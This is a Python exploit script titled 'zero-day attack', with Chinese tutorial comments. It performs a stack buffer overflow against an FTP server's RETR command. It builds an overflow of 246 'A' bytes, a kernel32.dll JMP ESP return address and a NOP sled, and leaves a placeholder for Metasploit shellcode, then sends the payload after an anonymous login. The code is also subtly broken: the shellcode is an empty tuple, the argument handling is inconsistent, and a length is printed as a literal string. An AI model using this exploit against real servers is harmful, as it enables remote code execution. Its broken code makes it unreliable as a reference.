"""
零日攻击
"""

import socket, sys, time, struct

if len(sys.argv) < 2:
    print("[-]Usage:%s <target addr> <command>"%sys.argv[0] + "\r")
    print("[-]For example [filename.py 192.168.1.10 PWND] would do the trick.")
    print("[-]Other options: AUTH, APPE, ALLO, ACCT")
    sys.exit(0)

target = sys.argv[1]
command = sys.argv[2]

if len(sys.argv) > 2:
    platform = sys.argv[2]
# 基于堆栈的缓冲区溢出攻击:
#   对于堆栈缓冲区溢出来说,未经检查的用户数据覆盖了下一个指令 EIP 从而控制程序的流程。Exploit 直接将 EIP 寄存器指向攻击者插入 ShellCode 的位置。
#   一系列的机器代码 ShellCode 能允许 exploit 在目标系统里增加用户,连接攻击者或者下载一个独立的可执行文件。ShellCode 有无尽的可能性存在,完全取决于内存空间的大小。

# 添加攻击的关键元素:
#   开始构建我们的 exploit 的关键元素:首先我们设置我们的shellcode 变量包含 Metasploit 框架为我们生成的十六进制编码的攻击荷载。接下来我们设置我们的溢出变量包含 246 个
# 字母 A 的实例(16 进制为\x41)。我们返回的地址变量指向一个 kernel.dll 地址,包含了一个直接跳到栈顶端的指令。我们填充包含一系列 150 个 NOP 指令的变量。这构建了我们的NOP 滑铲。
# 最后我们集合所有的变量组成一个变量,我们称为碰撞。


# 基于堆栈缓冲区溢出 exploit 的基本要素:
#   溢出:用户的输入超过了预期在栈中分配的值。
#   返回地址:被用来直接跳转到栈顶端的 4 个字节的地址。在接下来的exploit 中,我们用 4 个字节的地址指向 kernel.dll 的 JMP ESP 指令。
#   填充物:在 shellcode 之前的一系列的 NOP(空指令)指令。允许攻击者猜测直接跳到的地址。如果攻击者跳到 NOP 滑铲的任何地方,它将直接滑到shellcode。
#   Shellcode:一小段汇编机器码。在下面的例子中,我们将利用 Metasploit 生成 Shellcode 代码。

shellcode = ()
overflow = "\x41" * 246
ret = struct.pack('<L', 0x7C874413) #7C874413 JMP ESP kernel32.dll
padding = "\x90" * 150
crash = overflow + ret + padding + shellcode


# 发送 exploit:
#   使用伯克利套接字 API,我们将创建一个到我们目标主机 21 端口的 TCP 连接
#   如果连接成功,我们将通过发送匿名的用户名和 密码的到了主机的认证。
#   我们将发送 FTP 命令“RETR”紧接着是我们的碰撞变量。由于受影响的程序没有正确的过滤用户的输入,这将导致堆栈的缓冲区溢出覆盖了 EIP 寄存器允
# 许我们的程序直接跳到并执行我们的 Shellcode 代码。

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((target, 21))
except:
    print("[-] Connection to "+target+" failed!")
    sys.exit(0)
print("[*] Sending " + 'len(crash)' + " " + command +" byte crash...")
s.send("USER anonymous\r\n")
s.recv(1024)
s.send("PASS \r\n")
s.recv(1024)
s.send("RETR" +" " + crash + "\r\n")
time.sleep(4)
